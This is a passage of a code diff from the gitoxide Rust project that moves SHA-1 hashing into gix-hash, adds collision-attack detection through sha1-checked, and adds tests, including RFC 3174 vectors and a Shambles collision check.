Ok(written)\n-        }\n-\n-        fn flush(&mut self) -> std::io::Result<()> {\n-            self.inner.flush()\n-        }\n-    }\n-\n-    impl<T> Write<T>\n-    where\n-        T: std::io::Write,\n-    {\n-        /// Create a new hash writer which hashes all bytes written to `inner` with a hash of `kind`.\n-        pub fn new(inner: T, object_hash: gix_hash::Kind) -> Self {\n-            match object_hash {\n-                gix_hash::Kind::Sha1 => Write {\n-                    inner,\n-                    hash: Hasher::default(),\n-                },\n-            }\n-        }\n-    }\n-}\n-#[cfg(any(feature = \"rustsha1\", feature = \"fast-sha1\"))]\n-pub use write::Write;\n```\n\nFilename: gix-features/tests/hash.rs:\n```\n@@ -1,16 +0,0 @@\n-use gix_features::hash::Hasher;\n-\n-#[cfg(not(feature = \"fast-sha1\"))]\n-#[test]\n-fn size_of_sha1() {\n-    assert_eq!(std::mem::size_of::<Hasher>(), 96);\n-}\n-\n-#[cfg(feature = \"fast-sha1\")]\n-#[test]\n-fn size_of_sha1() {\n-    assert_eq!(\n-        std::mem::size_of::<Hasher>(),\n-        if cfg!(target_arch = \"x86\") { 96 } else { 104 }\n-    );\n-}\n```\n\nFilename: gix-filter/src/eol/convert_to_worktree.rs:\n```\n@@ -5,14 +5,22 @@\nuse crate::{\n     eol::{AttributesDigest, Configuration, Mode, Stats},\n };\n \n+/// The error produced by [`convert_to_worktree()`].\n+#[derive(Debug, thiserror::Error)]\n+#[allow(missing_docs)]\n+pub enum Error {\n+    #[error(\"Could not allocate buffer\")]\n+    OutOfMemory(#[from] std::collections::TryReserveError),\n+}\n+\n /// Convert all `\\n` in `src` to `crlf` if `digest` and `config` indicate it, returning `true` if `buf` holds the result, or `false`\n /// if no change was made after all.\n pub fn convert_to_worktree(\n     src: &[u8],\n     digest: AttributesDigest,\n     buf: &mut Vec<u8>,\n     config: Configuration,\n-) -> Result<bool, std::collections::TryReserveError> {\n+) -> Result<bool, Error> {\n     if src.is_empty() || digest.to_eol(config) != Some(Mode::CrLf) {\n         return Ok(false);\n     }\n```\n\nFilename: gix-filter/src/eol/mod.rs:\n```\n@@ -2,7 +2,8 @@\npub mod convert_to_git;\n pub use convert_to_git::function::convert_to_git;\n \n-mod convert_to_worktree;\n+///\n+pub mod convert_to_worktree;\n pub use convert_to_worktree::convert_to_worktree;\n \n mod utils;\n```\n\nFilename: gix-filter/src/ident.rs:\n```\n@@ -40,6 +40,19 @@\npub fn undo(src: &[u8], buf: &mut Vec<u8>) -> Result<bool, std::collections::Try\n     Ok(initialized)\n }\n \n+///\n+pub mod apply {\n+    /// The error produced by [`super::apply()`].\n+    #[derive(Debug, thiserror::Error)]\n+    #[allow(missing_docs)]\n+    pub enum Error {\n+        #[error(\"Could not allocate buffer\")]\n+        OutOfMemory(#[from] std::collections::TryReserveError),\n+        #[error(\"Could not hash blob\")]\n+        Hasher(#[from] gix_hash::hasher::Error),\n+    }\n+}\n+\n /// Substitute all occurrences of `$Id$` with `$Id: <hexsha-of-input>$` if present in `src` and write all changes to `buf`,\n /// with `object_hash` being used accordingly. Return `true` if `buf` was written to or `false` if no change was made\n /// (as there was nothing to do).\n\n@@ -48,18 +61,14 @@\npub fn undo(src: &[u8], buf: &mut Vec<u8>) -> Result<bool, std::collections::Try\n ///\n /// `Git` also tries to cleanup 'stray' substituted `$Id: <hex>$`, but we don't do that, sticking exactly to what ought to be done.\n /// The respective code is up to 16 years old and one might assume that `git` by now handles checking and checkout filters correctly.\n-pub fn apply(\n-    src: &[u8],\n-    object_hash: gix_hash::Kind,\n-    buf: &mut Vec<u8>,\n-) -> Result<bool, std::collections::TryReserveError> {\n+pub fn apply(src: &[u8], object_hash: gix_hash::Kind, buf: &mut Vec<u8>) -> Result<bool, apply::Error> {\n     const HASH_LEN: usize = \": \".len() + gix_hash::Kind::longest().len_in_hex();\n     let mut id = None;\n     let mut ofs = 0;\n     while let Some(pos) = src[ofs..].find(b\"$Id$\") {\n         let id = match id {\n             None => {\n-                let new_id = gix_object::compute_hash(object_hash, gix_object::Kind::Blob, src);\n+                let new_id = gix_object::compute_hash(object_hash, gix_object::Kind::Blob, src)?;\n                 id = new_id.into();\n                 clear_and_set_capacity(buf, src.len() + HASH_LEN)?; // pre-allocate for one ID\n                 new_id\n```\n\nFilename: gix-filter/src/pipeline/convert.rs:\n```\n@@ -49,14 +49,16 @@\npub mod to_worktree {\n     #[derive(Debug, thiserror::Error)]\n     #[allow(missing_docs)]\n     pub enum Error {\n+        #[error(transparent)]\n+        Ident(#[from] crate::ident::apply::Error),\n+        #[error(transparent)]\n+        Eol(#[from] crate::eol::convert_to_worktree::Error),\n         #[error(transparent)]\n         Worktree(#[from] crate::worktree::encode_to_worktree::Error),\n         #[error(transparent)]\n         Driver(#[from] crate::driver::apply::Error),\n         #[error(transparent)]\n         Configuration(#[from] super::configuration::Error),\n-        #[error(\"Could not allocate buffer\")]\n-        OutOfMemory(#[from] std::collections::TryReserveError),\n     }\n }\n```\n\nFilename: gix-hash/Cargo.toml:\n```\n@@ -20,15 +20,17 @@\ntest = false\n serde = [\"dep:serde\"]\n \n [dependencies]\n+gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\"progress\"] }\n+\n thiserror = \"2.0.0\"\n faster-hex = { version = \"0.9.0\" }\n serde = { version = \"1.0.114\", optional = true, default-features = false, features = [\"derive\"] }\n+sha1-checked = { version = \"0.10.0\", default-features = false }\n \n document-features = { version = \"0.2.0\", optional = true }\n \n [dev-dependencies]\n gix-testtools = { path = \"../tests/tools\" }\n-gix-features = { path = \"../gix-features\", features = [\"rustsha1\"] }\n \n [package.metadata.docs.rs]\n all-features = true\n```\n\nFilename: gix-hash/src/hasher.rs:\n```\n@@ -0,0 +1,71 @@\n+/// The error returned by [`Hasher::try_finalize()`](crate::Hasher::try_finalize()).\n+#[derive(Debug, thiserror::Error)]\n+#[allow(missing_docs)]\n+pub enum Error {\n+    #[error(\"Detected SHA-1 collision attack with digest {digest}\")]\n+    CollisionAttack { digest: crate::ObjectId },\n+}\n+\n+pub(super) mod _impl {\n+    use crate::hasher::Error;\n+    use sha1_checked::{CollisionResult, Digest};\n+\n+    /// An implementation of the Sha1 hash, which can be used once.\n+    ///\n+    /// We use [`sha1_checked`] to implement the same collision detection\n+    /// algorithm as Git.\n+    #[derive(Clone)]\n+    pub struct Hasher(sha1_checked::Sha1);\n+\n+    impl Hasher {\n+        /// Let's not provide a public default implementation to force people to go through [`hasher()`].\n+        fn default() -> Self {\n+            // This matches the configuration used by Git, which only uses\n+            // the collision detection to bail out, rather than computing\n+            // alternate \u201csafe hashes\u201d for inputs where a collision attack\n+            // was detected.\n+            Self(sha1_checked::Builder::default().safe_hash(false).build())\n+        }\n+    }\n+\n+    impl Hasher {\n+        /// Digest the given `bytes`.\n+        pub fn update(&mut self, bytes: &[u8]) {\n+            self.0.update(bytes);\n+        }\n+\n+        /// Finalize the hash and produce an object ID.\n+        ///\n+        /// Returns [`Error`] if a collision attack is detected.\n+        #[inline]\n+        pub fn try_finalize(self) -> Result<crate::ObjectId, Error> {\n+            match self.0.try_finalize() {\n+                CollisionResult::Ok(digest) => Ok(crate::ObjectId::Sha1(digest.into())),\n+                CollisionResult::Mitigated(_) => {\n+                    // SAFETY: `CollisionResult::Mitigated` is only\n+                    // returned when `safe_hash()` is on. `Hasher`\u2019s field\n+                    // is private, and we only construct it in the\n+                    // `Default` instance, which turns `safe_hash()` off.\n+                    //\n+                    // As of Rust 1.84.1, the compiler can\u2019t figure out\n+                    // this function cannot panic without this.\n+                    #[allow(unsafe_code)]\n+                    unsafe {\n+                        std::hint::unreachable_unchecked()\n+                    }\n+                }\n+                CollisionResult::Collision(digest) => Err(Error::CollisionAttack {\n+                    digest: crate::ObjectId::Sha1(digest.into()),\n+                }),\n+            }\n+        }\n+    }\n+\n+    /// Produce a hasher suitable for the given `kind` of hash.\n+    #[inline]\n+    pub fn hasher(kind: crate::Kind) -> Hasher {\n+        match kind {\n+            crate::Kind::Sha1 => Hasher::default(),\n+        }\n+    }\n+}\n```\n\nFilename: gix-hash/src/io.rs:\n```\n@@ -0,0 +1,126 @@\n+use crate::hasher;\n+\n+/// The error type for I/O operations that compute hashes.\n+#[derive(Debug, thiserror::Error)]\n+#[allow(missing_docs)]\n+pub enum Error {\n+    #[error(transparent)]\n+    Io(#[from] std::io::Error),\n+    #[error(\"Failed to hash data\")]\n+    Hasher(#[from] hasher::Error),\n+}\n+\n+pub(super) mod _impl {\n+    use crate::io::Error;\n+    use crate::{hasher, Hasher};\n+\n+    /// Compute the hash of `kind` for the bytes in the file at `path`, hashing only the first `num_bytes_from_start`\n+    /// while initializing and calling `progress`.\n+    ///\n+    /// `num_bytes_from_start` is useful to avoid reading trailing hashes, which are never part of the hash itself,\n+    /// denoting the amount of bytes to hash starting from the beginning of the file.\n+    ///\n+    /// # Note\n+    ///\n+    /// * [Interrupts][gix_features::interrupt] are supported.\n+    pub fn bytes_of_file(\n+        path: &std::path::Path,\n+        num_bytes_from_start: u64,\n+        kind: crate::Kind,\n+        progress: &mut dyn gix_features::progress::Progress,\n+        should_interrupt: &std::sync::atomic::AtomicBool,\n+    ) -> Result<crate::ObjectId, Error> {\n+        bytes(\n+            &mut std::fs::File::open(path)?,\n+            num_bytes_from_start,\n+            kind,\n+            progress,\n+            should_interrupt,\n+        )\n+    }\n+\n+    /// Similar to [`bytes_of_file`], but operates on a stream of bytes.\n+    pub fn bytes(\n+        read: &mut dyn std::io::Read,\n+        num_bytes_from_start: u64,\n+        kind: crate::Kind,\n+        progress: &mut dyn gix_features::progress::Progress,\n+        should_interrupt: &std::sync::atomic::AtomicBool,\n+    ) -> Result<crate::ObjectId, Error> {\n+        bytes_with_hasher(read, num_bytes_from_start, hasher(kind), progress, should_interrupt)\n+    }\n+\n+    /// Similar to [`bytes()`], but takes a `hasher` instead of a hash kind.\n+    pub fn bytes_with_hasher(\n+        read: &mut dyn std::io::Read,\n+        num_bytes_from_start: u64,\n+        mut hasher: Hasher,\n+        progress: &mut dyn gix_features::progress::Progress,\n+        should_interrupt: &std::sync::atomic::AtomicBool,\n+    ) -> Result<crate::ObjectId, Error> {\n+        let start = std::time::Instant::now();\n+        // init progress before the possibility for failure, as convenience in case people want to recover\n+        progress.init(\n+            Some(num_bytes_from_start as gix_features::progress::prodash::progress::Step),\n+            gix_features::progress::bytes(),\n+        );\n+\n+        const BUF_SIZE: usize = u16::MAX as usize;\n+        let mut buf = [0u8; BUF_SIZE];\n+        let mut bytes_left = num_bytes_from_start;\n+\n+        while bytes_left > 0 {\n+            let out = &mut buf[..BUF_SIZE.min(bytes_left as usize)];\n+            read.read_exact(out)?;\n+            bytes_left -= out.len() as u64;\n+            progress.inc_by(out.len());\n+            hasher.update(out);\n+            if should_interrupt.load(std::sync::atomic::Ordering::SeqCst) {\n+                return Err(std::io::Error::new(std::io::ErrorKind::Other, \"Interrupted\").into());\n+            }\n+        }\n+\n+        let id = hasher.try_finalize()?;\n+        progress.show_throughput(start);\n+        Ok(id)\n+    }\n+\n+    /// A utility to automatically generate a hash while writing into an inner writer.\n+    pub struct Write<T> {\n+        /// The hash implementation.\n+        pub hash: Hasher,\n+        /// The inner writer.\n+        pub inner: T,\n+    }\n+\n+    impl<T> std::io::Write for Write<T>\n+    where\n+        T: std::io::Write,\n+    {\n+        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {\n+            let written = self.inner.write(buf)?;\n+            self.hash.update(&buf[..written]);\n+            Ok(written)\n+        }\n+\n+        fn flush(&mut self) -> std::io::Result<()> {\n+            self.inner.flush()\n+        }\n+    }\n+\n+    impl<T> Write<T>\n+    where\n+        T: std::io::Write,\n+    {\n+        /// Create a new hash writer which hashes all bytes written to `inner` with a hash of `kind`.\n+        pub fn new(inner: T, object_hash: crate::Kind) -> Self {\n+            match object_hash {\n+                crate::Kind::Sha1 => Write {\n+                    inner,\n+                    hash: crate::hasher(object_hash),\n+                },\n+            }\n+        }\n+    }\n+}\n+pub use _impl::Write;\n```\n\nFilename: gix-hash/src/lib.rs:\n```\n@@ -13,12 +13,23 @@\nmod borrowed;\n pub use borrowed::{oid, Error};\n \n+/// Hash functions and hash utilities\n+pub mod hasher;\n+pub use hasher::_impl::{hasher, Hasher};\n+\n+/// Error types for utility hash functions\n+pub mod io;\n+pub use io::_impl::{bytes, bytes_of_file, bytes_with_hasher};\n+\n mod object_id;\n pub use object_id::{decode, ObjectId};\n \n ///\n pub mod prefix;\n \n+///\n+pub mod verify;\n+\n /// A partial, owned hash possibly identifying an object uniquely, whose non-prefix bytes are zeroed.\n ///\n /// An example would `0000000000000000000000000000000032bd3242`, where `32bd3242` is the prefix,\n```\n\nFilename: gix-hash/src/verify.rs:\n```\n@@ -0,0 +1,27 @@\n+use crate::{oid, ObjectId};\n+\n+/// The error returned by [`oid::verify()`].\n+#[derive(Debug, thiserror::Error)]\n+#[allow(missing_docs)]\n+#[error(\"Hash was {actual}, but should have been {expected}\")]\n+pub struct Error {\n+    pub actual: ObjectId,\n+    pub expected: ObjectId,\n+}\n+\n+impl oid {\n+    /// Verify that `self` matches the `expected` object ID.\n+    ///\n+    /// Returns an [`Error`] containing both object IDs if they differ.\n+    #[inline]\n+    pub fn verify(&self, expected: &oid) -> Result<(), Error> {\n+        if self == expected {\n+            Ok(())\n+        } else {\n+            Err(Error {\n+                actual: self.to_owned(),\n+                expected: expected.to_owned(),\n+            })\n+        }\n+    }\n+}\n```\n\nFilename: gix-hash/tests/fixtures/shambles/messageA:\n```\n\n```\n\nFilename: gix-hash/tests/fixtures/shambles/messageB:\n```\n\n```\n\nFilename: gix-hash/tests/hash/hasher.rs:\n```\n@@ -0,0 +1,20 @@\n+use gix_hash::{Hasher, ObjectId};\n+\n+#[test]\n+fn size_of_hasher() {\n+    assert_eq!(\n+        std::mem::size_of::<Hasher>(),\n+        if cfg!(target_arch = \"x86\") { 820 } else { 824 },\n+        \"The size of this type may be relevant when hashing millions of objects,\\\n+        and shouldn't change unnoticed. The DetectionState alone clocks in at 724 bytes.\"\n+    );\n+}\n+\n+#[test]\n+fn size_of_try_finalize_return_type() {\n+    assert_eq!(\n+        std::mem::size_of::<Result<ObjectId, gix_hash::hasher::Error>>(),\n+        21,\n+        \"The size of the return value is just 1 byte larger than just returning the object hash itself\"\n+    );\n+}\n```\n\nFilename: gix-hash/tests/hash/kind.rs:\n```\n\n```\n\nFilename: gix-hash/tests/hash/main.rs:\n```\n@@ -1,5 +1,6 @@\nuse gix_hash::ObjectId;\n \n+mod hasher;\n mod kind;\n mod object_id;\n mod oid;\n```\n\nFilename: gix-hash/tests/hash/object_id.rs:\n```\n@@ -0,0 +1,122 @@\n+mod from_hex {\n+\n+    mod valid {\n+        use gix_hash::ObjectId;\n+\n+        #[test]\n+        fn twenty_hex_chars_lowercase() {\n+            assert!(ObjectId::from_hex(b\"1234567890abcdefaaaaaaaaaaaaaaaaaaaaaaaa\").is_ok());\n+        }\n+\n+        #[test]\n+        fn twenty_hex_chars_uppercase() {\n+            assert!(ObjectId::from_hex(b\"1234567890ABCDEFAAAAAAAAAAAAAAAAAAAAAAAA\").is_ok());\n+        }\n+    }\n+\n+    mod invalid {\n+        use gix_hash::{decode, ObjectId};\n+\n+        #[test]\n+        fn non_hex_characters() {\n+            assert!(matches!(\n+                ObjectId::from_hex(b\"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\").unwrap_err(),\n+                decode::Error::Invalid\n+            ));\n+        }\n+\n+        #[test]\n+        fn too_short() {\n+            assert!(matches!(\n+                ObjectId::from_hex(b\"abcd\").unwrap_err(),\n+                decode::Error::InvalidHexEncodingLength(4)\n+            ));\n+        }\n+        #[test]\n+        fn too_long() {\n+            assert!(matches!(\n+                ObjectId::from_hex(b\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\").unwrap_err(),\n+                decode::Error::InvalidHexEncodingLength(41)\n+            ));\n+        }\n+    }\n+}\n+\n+mod sha1 {\n+    use std::str::FromStr as _;\n+\n+    use gix_hash::{hasher, Kind, ObjectId};\n+\n+    fn hash_contents(s: &[u8]) -> Result<ObjectId, hasher::Error> {\n+        let mut hasher = hasher(Kind::Sha1);\n+        hasher.update(s);\n+        hasher.try_finalize()\n+    }\n+\n+    #[test]\n+    fn empty_blob() {\n+        assert_eq!(\n+            ObjectId::empty_blob(Kind::Sha1),\n+            hash_contents(b\"blob 0\\0\").expect(\"empty blob to not collide\"),\n+        );\n+    }\n+\n+    #[test]\n+    fn empty_tree() {\n+        assert_eq!(\n+            ObjectId::empty_tree(Kind::Sha1),\n+            hash_contents(b\"tree 0\\0\").expect(\"empty tree to not collide\"),\n+        );\n+    }\n+\n+    /// Check the test vectors from RFC 3174.\n+    #[test]\n+    fn rfc_3174() {\n+        let fixtures: &[(&[u8], &str)] = &[\n+            (b\"abc\", \"A9 99 3E 36 47 06 81 6A BA 3E 25 71 78 50 C2 6C 9C D0 D8 9D\"),\n+            (\n+                b\"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq\",\n+                \"84 98 3E 44 1C 3B D2 6E BA AE 4A A1 F9 51 29 E5 E5 46 70 F1\",\n+            ),\n+            (\n+                &b\"a\".repeat(1000000),\n+                \"34 AA 97 3C D4 C4 DA A4 F6 1E EB 2B DB AD 27 31 65 34 01 6F\",\n+            ),\n+            (\n+                &b\"0123456701234567012345670123456701234567012345670123456701234567\".repeat(10),\n+                \"DE A3 56 A2 CD DD 90 C7 A7 EC ED C5 EB B5 63 93 4F 46 04 52\",\n+            ),\n+        ];\n+        for (input, output) in fixtures {\n+            assert_eq!(\n+                hash_contents(input).expect(\"RFC inputs to not collide\"),\n+                ObjectId::from_str(&output.to_lowercase().replace(' ', \"\")).expect(\"RFC digests to be valid\"),\n+            );\n+        }\n+    }\n+\n+    /// Check the \u201cSHA\u20101 is a Shambles\u201d chosen\u2010prefix collision.\n+    ///\n+    /// See <https://sha-mbles.github.io/>.\n+    ///\n+    /// We test these and not the earlier SHAttered PDFs because they are much smaller.\n+    #[test]\n+    fn shambles() {\n+        let message_a = include_bytes!(\"../fixtures/shambles/messageA\");\n+        let message_b = include_bytes!(\"../fixtures/shambles/messageB\");\n+        assert_ne!(message_a, message_b);\n+\n+        let expected =\n+            ObjectId::from_str(\"8ac60ba76f1999a1ab70223f225aefdc78d4ddc0\").expect(\"Shambles digest to be valid\");\n+\n+        let Err(hasher::Error::CollisionAttack { digest }) = hash_contents(message_a) else {\n+            panic!(\"expected Shambles input to collide\");\n+        };\n+        assert_eq!(digest, expected);\n+\n+        let Err(hasher::Error::CollisionAttack { digest }) = hash_contents(message_b) else {\n+            panic!(\"expected Shambles input to collide\");\n+        };\n+        assert_eq!(digest, expected);\n+    }\n+}\n```\n\nFilename: gix-hash/tests/hash/oid.rs:\n```\n\n```\n\nFilename: gix-hash/tests/hash/prefix.rs:\n```\n\n```\n\nFilename: gix-hash/tests/object_id/mod.rs:\n```\n@@ -1,64 +0,0 @@\n-mod from_hex {\n-\n-    mod valid {\n-        use gix_hash::ObjectId;\n-\n-        #[test]\n-        fn twenty_hex_chars_lowercase() {\n-            assert!(ObjectId::from_hex(b\"1234567890abcdefaaaaaaaaaaaaaaaaaaaaaaaa\").is_ok());\n-        }\n-\n-        #[test]\n-        fn twenty_hex_chars_uppercase() {\n-            assert!(ObjectId::from_hex(b\"1234567890ABCDEFAAAAAAAAAAAAAAAAAAAAAAAA\").is_ok());\n-        }\n-    }\n-\n-    mod invalid {\n-        use gix_hash::{decode, ObjectId};\n-\n-        #[test]\n-        fn non_hex_characters() {\n-            assert!(matches!(\n-                ObjectId::from_hex(b\"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\").unwrap_err(),\n-                decode::Error::Invalid\n-            ));\n-        }\n-\n-        #[test]\n-        fn too_short() {\n-            assert!(matches!(\n-                ObjectId::from_hex(b\"abcd\").unwrap_err(),\n-                decode::Error::InvalidHexEncodingLength(4)\n-            ));\n-        }\n-        #[test]\n-        fn too_long() {\n-            assert!(matches!(\n-                ObjectId::from_hex(b\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\").unwrap_err(),\n-                decode::Error::InvalidHexEncodingLength(41)\n-            ));\n-        }\n-    }\n-}\n-\n-mod empty {\n-    use gix_features::hash::hasher;\n-    use gix_hash::{Kind, ObjectId};\n-\n-    fn hash_contents(s: &[u8]) -> ObjectId {\n-        let mut hasher = hasher(Kind::Sha1);\n-        hasher.update(s);\n-        ObjectId::Sha1(hasher.digest())\n-    }\n-\n-    #[test]\n-    fn blob() {\n-        assert_eq!(ObjectId::empty_blob(Kind::Sha1), hash_contents(b\"blob 0\\0\"));\n-    }\n-\n-    #[test]\n-    fn tree() {\n-        assert_eq!(ObjectId::empty_tree(Kind::Sha1), hash_contents(b\"tree 0\\0\"));\n-    }\n-}\n```\n\nFilename: gix-index/Cargo.toml:\n```\n@@ -23,7 +23,6 @@\nserde = [\"dep:serde\", \"smallvec/serde\", \"gix-hash/serde\"]\n \n [dependencies]\n gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\n-    \"rustsha1\",\n     \"progress\",\n ] }\n gix-hash = { version = \"^0.16.0\", path = \"../gix-hash\" }\n```\n\nFilename: gix-index/src/decode/mod.rs:\n```\n@@ -16,17 +16,16 @@\nmod error {\n     pub enum Error {\n         #[error(transparent)]\n         Header(#[from] decode::header::Error),\n+        #[error(\"Could not hash index data\")]\n+        Hasher(#[from] gix_hash::hasher::Error),\n         #[error(\"Could not parse entry at index {index}\")]\n         Entry { index: u32 },\n         #[error(\"Mandatory extension wasn't implemented or malformed.\")]\n         Extension(#[from] extension::decode::Error),\n         #[error(\"Index trailer should have been {expected} bytes long, but was {actual}\")]\n         UnexpectedTrailerLength { expected: usize, actual: usize },\n-        #[error(\"Shared index checksum was {actual_checksum} but should have been {expected_checksum}\")]\n-        ChecksumMismatch {\n-            actual_checksum: gix_hash::ObjectId,\n-            expected_checksum: gix_hash::ObjectId,\n-        },\n+        #[error(\"Shared index checksum mismatch\")]\n+        Verify(#[from] gix_hash::verify::Error),\n     }\n }\n pub use error::Error;\n\n@@ -67,7 +66,7 @@\nimpl State {\n     ) -> Result<(Self, Option<gix_hash::ObjectId>), Error> {\n         let _span = gix_features::trace::detail!(\"gix_index::State::from_bytes()\", options = ?_options);\n         let (version, num_entries, post_header_data) = header::decode(data, object_hash)?;\n-        let start_of_extensions = extension::end_of_index_entry::decode(data, object_hash);\n+        let start_of_extensions = extension::end_of_index_entry::decode(data, object_hash)?;\n \n         let mut num_threads = gix_features::parallel::num_threads(thread_limit);\n         let path_backing_buffer_size = entries::estimate_path_storage_requirements_in_bytes(\n\n@@ -217,12 +216,7 @@\nimpl State {\n         let checksum = gix_hash::ObjectId::from_bytes_or_panic(data);\n         let checksum = (!checksum.is_null()).then_some(checksum);\n         if let Some((expected_checksum, actual_checksum)) = expected_checksum.zip(checksum) {\n-            if actual_checksum != expected_checksum {\n-                return Err(Error::ChecksumMismatch {\n-                    actual_checksum,\n-                    expected_checksum,\n-                });\n-            }\n+            actual_checksum.verify(&expected_checksum)?;\n         }\n         let EntriesOutcome {\n             entries,\n```\n\nFilename: gix-index/src/extension/end_of_index_entry/decode.rs:\n```\n@@ -13,41 +13,44 @@\nuse crate::{\n /// stored prior to this one to assure they are correct.\n ///\n /// If the checksum wasn't matched, we will ignore this extension entirely.\n-pub fn decode(data: &[u8], object_hash: gix_hash::Kind) -> Option<usize> {\n+pub fn decode(data: &[u8], object_hash: gix_hash::Kind) -> Result<Option<usize>, gix_hash::hasher::Error> {\n     let hash_len = object_hash.len_in_bytes();\n     if data.len() < MIN_SIZE_WITH_HEADER + hash_len {\n-        return None;\n+        return Ok(None);\n     }\n \n     let start_of_eoie = data.len() - MIN_SIZE_WITH_HEADER - hash_len;\n     let ext_data = &data[start_of_eoie..data.len() - hash_len];\n \n     let (signature, ext_size, ext_data) = extension::decode::header(ext_data);\n     if signature != SIGNATURE || ext_size as usize != MIN_SIZE {\n-        return None;\n+        return Ok(None);\n     }\n \n     let (offset, checksum) = ext_data.split_at(4);\n+    let Ok(checksum) = gix_hash::oid::try_from_bytes(checksum) else {\n+        return Ok(None);\n+    };\n     let offset = from_be_u32(offset) as usize;\n-    if offset < header::SIZE || offset > start_of_eoie || checksum.len() != gix_hash::Kind::Sha1.len_in_bytes() {\n-        return None;\n+    if offset < header::SIZE || offset > start_of_eoie || checksum.kind() != object_hash {\n+        return Ok(None);\n     }\n \n-    let mut hasher = gix_features::hash::hasher(gix_hash::Kind::Sha1);\n+    let mut hasher = gix_hash::hasher(object_hash);\n     let mut last_chunk = None;\n     for (signature, chunk) in extension::Iter::new(&data[offset..data.len() - MIN_SIZE_WITH_HEADER - hash_len]) {\n         hasher.update(&signature);\n         hasher.update(&(chunk.len() as u32).to_be_bytes());\n         last_chunk = Some(chunk);\n     }\n \n-    if hasher.digest() != checksum {\n-        return None;\n+    if hasher.try_finalize()?.verify(checksum).is_err() {\n+        return Ok(None);\n     }\n     // The last-to-this chunk ends where ours starts\n     if last_chunk.map_or(true, |s| s.as_ptr_range().end != (&data[start_of_eoie]) as *const _) {\n-        return None;\n+        return Ok(None);\n     }\n \n-    Some(offset)\n+    Ok(Some(offset))\n }\n```\n\nFilename: gix-index/src/extension/end_of_index_entry/write.rs:\n```\n@@ -11,19 +11,19 @@\npub fn write_to(\n     hash_kind: gix_hash::Kind,\n     offset_to_extensions: u32,\n     prior_extensions: impl IntoIterator<Item = (Signature, u32)>,\n-) -> Result<(), std::io::Error> {\n+) -> Result<(), gix_hash::io::Error> {\n     out.write_all(&SIGNATURE)?;\n     let extension_size: u32 = 4 + hash_kind.len_in_bytes() as u32;\n     out.write_all(&extension_size.to_be_bytes())?;\n \n     out.write_all(&offset_to_extensions.to_be_bytes())?;\n \n-    let mut hasher = gix_features::hash::hasher(hash_kind);\n+    let mut hasher = gix_hash::hasher(hash_kind);\n     for (signature, size) in prior_extensions {\n         hasher.update(&signature);\n         hasher.update(&size.to_be_bytes());\n     }\n-    out.write_all(&hasher.digest())?;\n+    out.write_all(hasher.try_finalize()?.as_slice())?;\n \n     Ok(())\n }\n```\n\nFilename: gix-index/src/file/init.rs:\n```\n@@ -75,20 +75,19 @@\nimpl File {\n                     let _span = gix_features::trace::detail!(\"gix::open_index::hash_index\", path = ?path);\n                     let meta = file.metadata()?;\n                     let num_bytes_to_hash = meta.len() - object_hash.len_in_bytes() as u64;\n-                    let actual_hash = gix_features::hash::bytes(\n+                    gix_hash::bytes(\n                         &mut file,\n                         num_bytes_to_hash,\n                         object_hash,\n                         &mut gix_features::progress::Discard,\n                         &Default::default(),\n-                    )?;\n-\n-                    if actual_hash != expected {\n-                        return Err(Error::Decode(decode::Error::ChecksumMismatch {\n-                            actual_checksum: actual_hash,\n-                            expected_checksum: expected,\n-                        }));\n-                    }\n+                    )\n+                    .map_err(|err| match err {\n+                        gix_hash::io::Error::Io(err) => Error::Io(err),\n+                        gix_hash::io::Error::Hasher(err) => Error::Decode(err.into()),\n+                    })?\n+                    .verify(&expected)\n+                    .map_err(decode::Error::from)?;\n                 }\n             }\n```\n\nFilename: gix-index/src/file/verify.rs:\n```\n@@ -8,12 +8,9 @@\nmod error {\n     #[allow(missing_docs)]\n     pub enum Error {\n         #[error(\"Could not read index file to generate hash\")]\n-        Io(#[from] std::io::Error),\n-        #[error(\"Index checksum should have been {expected}, but was {actual}\")]\n-        ChecksumMismatch {\n-            actual: gix_hash::ObjectId,\n-            expected: gix_hash::ObjectId,\n-        },\n+        Io(#[from] gix_hash::io::Error),\n+        #[error(\"Index checksum mismatch\")]\n+        Verify(#[from] gix_hash::verify::Error),\n     }\n }\n pub use error::Error;\n\n@@ -23,21 +20,18 @@\nimpl File {\n     pub fn verify_integrity(&self) -> Result<(), Error> {\n         let _span = gix_features::trace::coarse!(\"gix_index::File::verify_integrity()\");\n         if let Some(checksum) = self.checksum {\n-            let num_bytes_to_hash = self.path.metadata()?.len() - checksum.as_bytes().len() as u64;\n+            let num_bytes_to_hash =\n+                self.path.metadata().map_err(gix_hash::io::Error::from)?.len() - checksum.as_bytes().len() as u64;\n             let should_interrupt = AtomicBool::new(false);\n-            let actual = gix_features::hash::bytes_of_file(\n+            gix_hash::bytes_of_file(\n                 &self.path,\n                 num_bytes_to_hash,\n                 checksum.kind(),\n                 &mut gix_features::progress::Discard,\n                 &should_interrupt,\n-            )?;\n-            (actual == checksum).then_some(()).ok_or(Error::ChecksumMismatch {\n-                actual,\n-                expected: checksum,\n-            })\n-        } else {\n-            Ok(())\n+            )?\n+            .verify(&checksum)?;\n         }\n+        Ok(())\n     }\n }\n```\n\nFilename: gix-index/src/file/write.rs:\n```\n@@ -1,13 +1,11 @@\n-use gix_features::hash;\n-\n use crate::{write, File, Version};\n \n /// The error produced by [`File::write()`].\n #[derive(Debug, thiserror::Error)]\n #[allow(missing_docs)]\n pub enum Error {\n     #[error(transparent)]\n-    Io(#[from] std::io::Error),\n+    Io(#[from] gix_hash::io::Error),\n     #[error(\"Could not acquire lock for index file\")]\n     AcquireLock(#[from] gix_lock::acquire::Error),\n     #[error(\"Could not commit lock for index file\")]\n\n@@ -21,17 +19,17 @@\nimpl File {\n         &self,\n         mut out: impl std::io::Write,\n         options: write::Options,\n-    ) -> std::io::Result<(Version, gix_hash::ObjectId)> {\n+    ) -> Result<(Version, gix_hash::ObjectId), gix_hash::io::Error> {\n         let _span = gix_features::trace::detail!(\"gix_index::File::write_to()\", skip_hash = options.skip_hash);\n         let (version, hash) = if options.skip_hash {\n             let out: &mut dyn std::io::Write = &mut out;\n             let version = self.state.write_to(out, options)?;\n             